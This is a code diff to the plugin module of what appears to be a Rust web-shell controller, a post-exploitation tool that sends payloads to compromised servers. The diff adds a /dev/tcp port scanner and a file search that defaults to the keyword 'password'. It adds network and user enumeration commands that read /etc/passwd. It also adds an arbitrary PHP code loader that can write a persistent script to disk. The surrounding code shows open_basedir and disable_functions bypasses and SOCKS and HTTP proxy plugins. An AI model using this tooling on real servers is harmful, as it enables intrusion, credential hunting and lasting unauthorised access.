@@ -31,6 +31,14 @@ fn param_bool(params: &serde_json::Value, name: &str, default: bool) -> bool {
         .unwrap_or(default)
 }
 
+fn dirname_cmd(path: &str) -> &str {
+    path.rsplit_once('/').map(|(d, _)| d).unwrap_or(".")
+}
+
+fn basename_cmd(path: &str) -> &str {
+    path.rsplit_once('/').map(|(_, b)| b).unwrap_or(path)
+}
+
 fn run_command(
     protocol: &dyn Protocol,
     session: &dyn SessionState,
@@ -66,6 +74,7 @@ impl FeaturePlugin for ProcessesPlugin {
             category: "general".into(),
             languages: vec![],
             params: vec![],
+            kind: "feature".into(),
         }
     }
 
@@ -139,6 +148,7 @@ impl FeaturePlugin for PortScanPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -171,9 +181,20 @@ impl FeaturePlugin for PortScanPlugin {
                     .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))?;
                 Ok(parsed)
             }
-            other => Err(ProtocolError::NotSupported(format!(
-                "端口扫描暂不支持运行时 {other}（待协议实现后补载荷模板）"
-            ))),
+            // 非 PHP：命令型 /dev/tcp 扫描（Linux 环境）
+            other => {
+                let ports: Vec<String> = ports.iter().map(|p| p.to_string()).collect();
+                let checks: Vec<String> = ports
+                    .iter()
+                    .map(|p| {
+                        format!(
+                            "(echo >/dev/tcp/{host}/{p}) 2>/dev/null && echo '{p} open' || echo '{p} closed'"
+                        )
+                    })
+                    .collect();
+                let command = format!("for c in {}; do $c; done", checks.join("; "));
+                run_command(protocol, session, &command, settings)
+            }
         }
     }
 }
@@ -220,6 +241,7 @@ impl FeaturePlugin for PhpEnvPlugin {
             category: "php".into(),
             languages: vec!["php".into()],
             params: vec![],
+            kind: "feature".into(),
         }
     }
 
@@ -302,6 +324,7 @@ impl FeaturePlugin for ZipPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -314,19 +337,26 @@ impl FeaturePlugin for ZipPlugin {
         settings: &AppSettings,
     ) -> Result<serde_json::Value, ProtocolError> {
         let language = runtime;
+        let source = param_str(params, "source", ".");
+        let target = param_str(params, "target", "/tmp/backup.zip");
         match language {
             "php" => {
-                let source = param_str(params, "source", ".");
-                let target = param_str(params, "target", "/tmp/backup.zip");
                 let code = php_zip_code(&source, &target);
                 let output = protocol.run_code(session, "php", &code, settings)?;
                 serde_json::from_str(&output).map_err(|_| {
                     ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                 })
             }
-            other => Err(ProtocolError::NotSupported(format!(
-                "ZIP 压缩暂不支持运行时 {other}（待协议实现后补载荷模板）"
-            ))),
+            // 非 PHP：系统 zip 命令（zip 可用时）
+            other => {
+                let command = format!(
+                    "cd {} && zip -r {} {} 2>&1 || echo 'zip unavailable'",
+                    dirname_cmd(&source),
+                    &target,
+                    basename_cmd(&source),
+                );
+                run_command(protocol, session, &command, settings)
+            }
         }
     }
 }
@@ -435,6 +465,7 @@ impl FeaturePlugin for WebShellScanPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -513,6 +544,7 @@ impl FeaturePlugin for SuperTerminalPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -580,6 +612,7 @@ impl FeaturePlugin for EvalCodePlugin {
                 default: Some(serde_json::json!("echo 'hello';")),
                 options: None,
             }],
+            kind: "feature".into(),
         }
     }
 
@@ -651,6 +684,7 @@ impl FeaturePlugin for RealCmdPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -777,6 +811,7 @@ impl FeaturePlugin for SocksProxyPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -925,6 +960,7 @@ impl FeaturePlugin for HttpProxyPlugin {
                     options: None,
                 },
             ],
+            kind: "feature".into(),
         }
     }
 
@@ -1027,6 +1063,7 @@ impl FeaturePlugin for BypassOpenBasedirPlugin {
                 default: Some(serde_json::json!("/etc/passwd")),
                 options: None,
             }],
+            kind: "feature".into(),
         }
     }
 
@@ -1143,6 +1180,7 @@ impl FeaturePlugin for BypassDisableFunctionsPlugin {
                 default: Some(serde_json::json!("id")),
                 options: None,
             }],
+            kind: "feature".into(),
         }
     }
 
@@ -1162,6 +1200,402 @@ impl FeaturePlugin for BypassDisableFunctionsPlugin {
         let command = param_str(params, "command", "id");
         let code = php_bypass_disable_functions_code(&command);
         let output = protocol.run_code(session, "php", &code, settings)?;
+        serde_json::from_str(&output)
+            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 文件搜索（通用，PHP 代码型：文件名/内容匹配）
+// ---------------------------------------------------------------------------
+
+fn php_file_search_code(dir: &str, keyword: &str, in_content: bool, max_depth: u32) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$root = {dir};
+$kw = {keyword};
+$inContent = {content};
+$maxDepth = {depth};
+$out = array('root' => $root, 'scanned' => 0, 'matches' => array());
+$it = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
+    RecursiveIteratorIterator::SELF_FIRST
+);
+$it->setMaxDepth($maxDepth);
+foreach ($it as $f) {{
+    if (!$f->isFile()) continue;
+    $out['scanned']++;
+    if ($out['scanned'] > 20000) break;
+    $size = $f->getSize();
+    if ($size > 5000000) continue;
+    $hit = false;
+    if ($inContent) {{
+        $content = @file_get_contents($f->getRealPath());
+        $hit = $content !== false && strpos($content, $kw) !== false;
+    }} else {{
+        $hit = stripos($f->getFilename(), $kw) !== false;
+    }}
+    if ($hit && count($out['matches']) < 200) {{
+        $out['matches'][] = array('path' => $f->getRealPath(), 'size' => $size,
+            'name' => $f->getFilename(), 'mtime' => $f->getMTime());
+    }}
+}}
+echo json_encode($out);
+"#,
+        dir = serde_json::to_string(dir).unwrap_or_else(|_| "\".\"".to_string()),
+        keyword = serde_json::to_string(keyword).unwrap_or_else(|_| "\"\"".to_string()),
+        content = if in_content { "true" } else { "false" },
+        depth = max_depth,
+    )
+}
+
+/// 文件搜索（通用）：文件名或内容关键字匹配。
+pub struct FileSearchPlugin;
+
+impl FeaturePlugin for FileSearchPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "file_search".into(),
+            name: "文件搜索".into(),
+            version: "1.0.0".into(),
+            description: "递归搜索目标目录：按文件名或文件内容关键字匹配。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "dir".into(),
+                    label: "搜索目录".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!(".")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "keyword".into(),
+                    label: "关键字".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("password")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "in_content".into(),
+                    label: "匹配文件内容".into(),
+                    param_type: "bool".into(),
+                    default: Some(serde_json::json!(false)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "max_depth".into(),
+                    label: "最大深度".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(4)),
+                    options: None,
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let dir = param_str(params, "dir", ".");
+                let keyword = param_str(params, "keyword", "");
+                let in_content = param_bool(params, "in_content", false);
+                let depth = param_int(params, "max_depth", 4).clamp(1, 8);
+                let code = php_file_search_code(&dir, &keyword, in_content, depth);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "文件搜索暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 网络信息（通用，命令型：多语言命令模板）
+// ---------------------------------------------------------------------------
+
+fn netinfo_command(language: &str) -> &'static str {
+    match language {
+        "aspnet" | "asp" => "ipconfig /all 2>nul & netstat -an 2>nul",
+        _ => "ifconfig 2>/dev/null || ip addr 2>/dev/null; echo ---; netstat -tunap 2>/dev/null | head -40 || netstat -an 2>/dev/null | head -40",
+    }
+}
+
+/// 网络信息（通用）：网卡 / 连接 / 路由。
+pub struct NetInfoPlugin;
+
+impl FeaturePlugin for NetInfoPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "netinfo".into(),
+            name: "网络信息".into(),
+            version: "1.0.0".into(),
+            description: "收集网卡、活动连接与路由信息（按语言选择命令）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        _params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        run_command(protocol, session, netinfo_command(runtime), settings)
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 用户枚举（通用，命令型）
+// ---------------------------------------------------------------------------
+
+fn userlist_command(language: &str) -> &'static str {
+    match language {
+        "aspnet" | "asp" => "net user 2>nul & echo --- & whoami 2>nul",
+        _ => "cat /etc/passwd 2>/dev/null | head -60; echo ---; whoami 2>/dev/null; id 2>/dev/null",
+    }
+}
+
+/// 用户枚举（通用）：账户列表 + 当前用户。
+pub struct UserListPlugin;
+
+impl FeaturePlugin for UserListPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "userlist".into(),
+            name: "用户枚举".into(),
+            version: "1.0.0".into(),
+            description: "枚举系统账户与当前身份（按语言选择命令）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        _params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        run_command(protocol, session, userlist_command(runtime), settings)
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 加解密工具（通用，PHP 代码型：AES-256/XOR 文本加解密）
+// ---------------------------------------------------------------------------
+
+fn php_crypto_tool_code(op: &str, algorithm: &str, text: &str, pass: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$op = {op};
+$algo = {algorithm};
+$text = {text};
+$pass = {pass};
+$key = hash('sha256', $pass, true);
+if ($op === 'encrypt') {{
+    if ($algo === 'aes') {{
+        $iv = substr($key, 0, 16);
+        $padded = $text . str_repeat(chr(16 - (strlen($text) % 16)), 16 - (strlen($text) % 16));
+        $out = base64_encode(openssl_encrypt($text, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv));
+    }} else {{
+        $k = hash('md5', $pass);
+        $out = base64_encode($text ^ str_repeat($k, intdiv(strlen($text), strlen($k)) + 1));
+    }}
+}} else {{
+    if ($algo === 'aes') {{
+        $iv = substr($key, 0, 16);
+        $out = openssl_decrypt(base64_decode($text), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
+        $out = $out === false ? '(解密失败)' : rtrim($out, "\x00..\x10");
+    }} else {{
+        $k = hash('md5', $pass);
+        $raw = base64_decode($text);
+        $out = $raw ^ str_repeat($k, intdiv(strlen($raw), strlen($k)) + 1);
+    }}
+}}
+echo json_encode(array('ok' => true, 'op' => $op, 'algo' => $algo, 'result' => $out));
+"#,
+        op = serde_json::to_string(op).unwrap_or_else(|_| "\"encrypt\"".to_string()),
+        algorithm = serde_json::to_string(algorithm).unwrap_or_else(|_| "\"aes\"".to_string()),
+        text = serde_json::to_string(text).unwrap_or_else(|_| "\"\"".to_string()),
+        pass = serde_json::to_string(pass).unwrap_or_else(|_| "\"\"".to_string()),
+    )
+}
+
+/// 加解密工具（加密器类型）：AES-256-CBC / XOR 文本加解密。
+pub struct CryptoToolPlugin;
+
+impl FeaturePlugin for CryptoToolPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "crypto_tool".into(),
+            name: "加解密工具".into(),
+            version: "1.0.0".into(),
+            description: "在目标上执行文本加解密（AES-256-CBC / MD5-XOR），结果即时查看。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "op".into(),
+                    label: "操作".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("encrypt")),
+                    options: Some(vec!["encrypt".into(), "decrypt".into()]),
+                },
+                ParamSpec {
+                    name: "algorithm".into(),
+                    label: "算法".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("aes")),
+                    options: Some(vec!["aes".into(), "xor".into()]),
+                },
+                ParamSpec {
+                    name: "text".into(),
+                    label: "文本".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("hello")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "pass".into(),
+                    label: "口令".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("secret")),
+                    options: None,
+                },
+            ],
+            kind: "crypto".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let op = param_str(params, "op", "encrypt");
+                let algorithm = param_str(params, "algorithm", "aes");
+                let text = param_str(params, "text", "");
+                let pass = param_str(params, "pass", "");
+                let code = php_crypto_tool_code(&op, &algorithm, &text, &pass);
+                let output = protocol.run_code(session, "php", &code, settings)?;
+                serde_json::from_str(&output).map_err(|_| {
+                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
+                })
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "加解密工具暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 代码加载器（加载器类型）：执行 PHP 代码 + 可选写入持久化文件
+// ---------------------------------------------------------------------------
+
+fn php_code_loader_code(code: &str, persist_path: &str) -> String {
+    format!(
+        r#"<?php
+error_reporting(0);
+$persist = {path};
+if ($persist !== '') {{
+    $script = '<?php ' . '{code_esc}' . ' ?>';
+    $w = @file_put_contents($persist, $script);
+}}
+ob_start();
+try {{
+{code_raw}
+}} catch (Exception $e) {{
+    echo (string)$e;
+}}
+$output = ob_get_clean();
+echo json_encode(array('ok' => true, 'persisted' => $persist !== '' && isset($w) && $w !== false,
+    'persist_path' => $persist, 'output' => $output));
+"#,
+        code_raw = code,
+        code_esc = code.replace("\\", "\\\\").replace("'", "\\'"),
+        path = serde_json::to_string(persist_path).unwrap_or_else(|_| "\"\"".to_string()),
+    )
+}
+
+/// 代码加载器（加载器类型）：任意 PHP 代码执行 + 可选落盘持久化。
+pub struct CodeLoaderPlugin;
+
+impl FeaturePlugin for CodeLoaderPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "php_code_loader".into(),
+            name: "代码加载器".into(),
+            version: "1.0.0".into(),
+            description: "执行任意 PHP 代码；可同时写入持久化脚本（加载器）。".into(),
+            category: "php".into(),
+            languages: vec!["php".into()],
+            params: vec![
+                ParamSpec {
+                    name: "code".into(),
+                    label: "PHP 代码".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("echo 'loaded';")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "persist_path".into(),
+                    label: "持久化路径（可选，写入后提示）".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+            ],
+            kind: "loader".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        if runtime != "php" {
+            return Err(ProtocolError::NotSupported(format!(
+                "代码加载器仅支持 php 运行时（当前 {runtime}）"
+            )));
+        }
+        let code = param_str(params, "code", "echo 'loaded';");
+        let persist = param_str(params, "persist_path", "");
+        let payload = php_code_loader_code(&code, &persist);
+        let output = protocol.run_code(session, "php", &payload, settings)?;
         serde_json::from_str(&output)
             .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
     }
